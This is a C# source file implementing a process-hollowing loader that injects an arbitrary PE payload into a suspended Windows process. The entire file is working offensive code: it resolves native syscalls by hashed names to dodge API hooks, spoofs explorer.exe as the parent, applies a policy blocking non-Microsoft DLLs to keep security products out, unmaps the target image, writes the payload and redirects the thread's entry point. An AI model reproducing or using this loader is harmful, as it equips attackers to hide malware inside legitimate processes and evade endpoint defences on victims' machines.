using DynamicSyscalls;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    internal class ProcessHollowing
    {
   
        public static void Execute(byte[] bPayload, string InjectionPath , string Command) 
        {
          
            #region Init SysCalls
            var CreateUserProcess = DynamicInvoke.GetDelegate<Native.NtCreateUserProcess>("a94d1155ccc099603a91660f7d100c9f", true);
            var GetContextThread = DynamicInvoke.GetDelegate<Native.NtGetContextThread>("e3caba93d519b11dcb06c807c4924287", true);
            var SetContextThread = DynamicInvoke.GetDelegate<Native.NtSetContextThread>("7da2397d138b0354f2d6024b0ae29a65", true);
            var UnmapViewOfSection = DynamicInvoke.GetDelegate<Native.NtUnmapViewOfSection>("84ae108241fdd90f70927402b4372687", true);
            var WriteVirtualMemory = DynamicInvoke.GetDelegate<Native.NtWriteVirtualMemory>("274e21507fce26a09c731cb2a89f6702", true);
            var ReadVirtualMemory = DynamicInvoke.GetDelegate<Native.NtReadVirtualMemory>("db5314760fd7298555bab342c1137312", true);
            var AllocateVirtualMemory = DynamicInvoke.GetDelegate<Native.NtAllocateVirtualMemory>("445748b2bdab65055f58ca90ffd62c56", true);
            var ResumeThread = DynamicInvoke.GetDelegate<Native.NtResumeThread>("8efd0cbc7410f60b07b2baad2824066e", true);
            #endregion

            #region Create Process With PID Spoofing and Mitigation Only Microsoft Binaries



            Process ParentProcess = Process.GetProcessesByName("explorer")[0];
            UnicodeString NtCommand = Helper.ToUnicode(string.Format("{0} {1}", InjectionPath,Command));
            UnicodeString NtImagePath = Helper.ToUnicode(String.Format("\\??\\{0}",InjectionPath));

            IntPtr pProcessParams = IntPtr.Zero;
            uint RtlCreateSuccess = Native.RtlCreateProcessParametersEx(ref pProcessParams, Helper.ToPointer(NtImagePath), IntPtr.Zero, IntPtr.Zero, Helper.ToPointer(NtCommand), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x01);
            if (RtlCreateSuccess != 0)
            {
                Console.WriteLine("RtlCreateProcessParametersEx Failed");
                return;
            }

            PsCreateInfo info = new PsCreateInfo();
            info.Size = (UIntPtr)Marshal.SizeOf<PsCreateInfo>();
            info.State = PsCreateState.PsCreateInitialState;


            PsAttributeList attributeList = new PsAttributeList();
            attributeList.Init();


            //Image To Be Loaded
            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[0].Attribute = Native.PS_ATTRIBUTE_IMAGE_NAME;
            attributeList.Attributes[0].Size = (UIntPtr)NtImagePath.Length;
            attributeList.Attributes[0].Value = NtImagePath.Buffer;


            // Parent Process Spoofing
            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[1].Attribute = Native.PS_ATTRIBUTE_PARENT_PROCESS;
            attributeList.Attributes[1].Size = (UIntPtr)IntPtr.Size;
            attributeList.Attributes[1].Value = ParentProcess.Handle;



            //NON_MICROSOFT_BINARIES_ALWAYS_ON

            IntPtr pValue = Marshal.AllocHGlobal(UIntPtr.Size);
            Marshal.WriteInt64(pValue, Native.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[2].Attribute = Native.PS_ATTRIBUTE_MITIGATION_OPTIONS;
            attributeList.Attributes[2].Size = (UIntPtr)UIntPtr.Size;
            attributeList.Attributes[2].Value = pValue;

            IntPtr ProcessHandle = IntPtr.Zero;
            IntPtr ThreadHandle = IntPtr.Zero;

            //Create Process With Suspened State
            uint NtCreateSuccess = CreateUserProcess(ref ProcessHandle, ref ThreadHandle, Native.PROCESS_ALL_ACCESS, Native.THREAD_ALL_ACCESS, IntPtr.Zero, IntPtr.Zero, 0, Native.THREAD_CREATE_FLAGS_CREATE_SUSPENDED, pProcessParams, ref info, ref attributeList);
            if (NtCreateSuccess != 0)
            {
                Console.WriteLine("NtCreateUserProcess Failed");
                return;
            }
            #endregion

            #region GetContext , ImageBase , Unmap
            uint readWrite = 0;
            Context context = new Context() { ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL };
            GetContextThread(ThreadHandle, ref context);
            ulong rdx = context.Rdx;
            ulong hImageBase = rdx + 16;
            IntPtr remoteImageBase = Marshal.AllocHGlobal(8);
            ReadVirtualMemory(ProcessHandle, hImageBase, remoteImageBase, 8 , ref readWrite);
            UnmapViewOfSection(ProcessHandle, remoteImageBase);
            #endregion

            #region Allocate And Write for New PE File
            int Elfanew = BitConverter.ToInt32(bPayload, 0x3C);
            long ImageBase = BitConverter.ToInt64(bPayload, Elfanew + 0x30);
            uint sizeOfImage = BitConverter.ToUInt32(bPayload, Elfanew + 0x50);
            uint sizeOfHeaders = BitConverter.ToUInt32(bPayload, Elfanew + 0x54);
            IntPtr hAllocated = (IntPtr)ImageBase;
            AllocateVirtualMemory(ProcessHandle,ref hAllocated , 0,ref sizeOfImage , Native.Commit | Native.Reserve , Native.ExecuteReadWrite);
            WriteVirtualMemory(ProcessHandle, hAllocated, bPayload, sizeOfHeaders,ref readWrite);

            int EntryPointRVA = BitConverter.ToInt32(bPayload, Elfanew + 0x28);
            int numberOfSections = BitConverter.ToInt16(bPayload, Elfanew + 0x6);
            int sizeOfOptionalHeader = BitConverter.ToInt16(bPayload , Elfanew + 0x10 + 0x04);
            for (int i = 0; i < numberOfSections; i++)
            {

                int sectionOffset = Elfanew + 0x18 + sizeOfOptionalHeader + i * 0x28;
                int virtualAddress = BitConverter.ToInt32(bPayload, sectionOffset + 0xC);
                int sizeOfRawData = BitConverter.ToInt32(bPayload, sectionOffset + 0x10);
                int pointerToRawData = BitConverter.ToInt32(bPayload, sectionOffset + 0x14);

                if (sizeOfRawData != 0x0)
                {
                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(bPayload, pointerToRawData, sectionData, 0x0, sectionData.Length);
                    WriteVirtualMemory(ProcessHandle, IntPtr.Add(hAllocated, virtualAddress), sectionData, ((uint)sectionData.Length),ref readWrite);
                }
          }


            #endregion

            #region Update ImageBase,EntryPoint,Resume Thread

            byte[] bImageBase = BitConverter.GetBytes(ImageBase);
            WriteVirtualMemory(ProcessHandle, (IntPtr)hImageBase, bImageBase, 0x8,ref readWrite);
            context.Rcx = (ulong)hAllocated + (ulong)EntryPointRVA;
            SetContextThread(ThreadHandle,ref context);

            uint suspendCount = 0;
            ResumeThread(ThreadHandle,ref suspendCount);
            #endregion

            #region Cleaning
            DynamicInvoke.FreeMemory();
            Helper.FreeMemory();
            Marshal.FreeHGlobal(pValue);
            Marshal.FreeHGlobal(remoteImageBase);

            #endregion
        }
    }
}
